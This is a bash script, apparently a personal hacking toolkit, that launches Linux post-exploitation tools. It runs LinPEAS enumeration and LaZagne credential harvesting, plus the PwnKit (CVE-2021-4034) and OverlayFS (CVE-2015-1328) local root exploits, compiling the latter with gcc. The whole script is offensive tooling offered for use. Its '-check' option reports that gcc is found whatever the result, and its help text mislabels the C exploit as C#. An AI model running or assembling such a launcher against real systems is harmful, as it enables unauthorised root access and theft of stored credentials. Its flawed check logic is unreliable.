#!/bin/bash

ascii() {
     cat <<"EOF"
                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
EOF
}                                  

if [[ "$*" == "-help" ]]; then
    ascii
    echo " "
    echo " "
    echo "Usage: ./fullEx.sh COMMAND"
    echo " "
    echo "Commands:"
    echo "   -LinPeas       Execute LinPeas"
    echo "   -LaZagne       Execute LaZagne"
    echo " " 
    echo "OverlaysFS:"
    echo "   -OverC         Compile le script C#"
    echo "   -Overlays      Overlays64 - CVE-2015-1328"
    echo " " 
    echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
    echo "   -check         Verifie si gcc est installer"
    echo "   -perm          Applique les droit d'execution sur '/fullEx'"
    echo " "
    exit 0
fi

# Application des droit d'execution
if [[ "$*" == "-perm" ]]; then
   find ${PWD} -type f -exec chmod +x {} \;
fi

# Verifie si GCC est installer
if [[ "$*" == "-check" ]]; then
   which gcc > /dev/null 2>&1
   echo "[+] GCC found !"
fi

# LinPeas
if [[ "$*" == "-LinPeas" ]]; then
   "${PWD}/linpeas/linpeas.sh"
fi

# LaZagne
if [[ "$*" == "-LaZagne" ]]; then
  "${PWD}/LaZagne/Linux/laZagne.py"
fi

# PwnKit
for arch in 64 32; do
     if [[ "$*" == "-PwnKit${arch}" ]]; then
          "${PWD}/exploit/PwnKit/PwnKit${arch}"
     fi
done

# Compilation OverlayFS
if [[ "$*" == "-OverC" ]]; then
     gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
     echo "[+] Compilation successfuly !"
fi

# Execution OverlayFS
if [[ "$*" == "-Overlays" ]]; then
     "${PWD}/exploit/Overlays/overlays"
fi
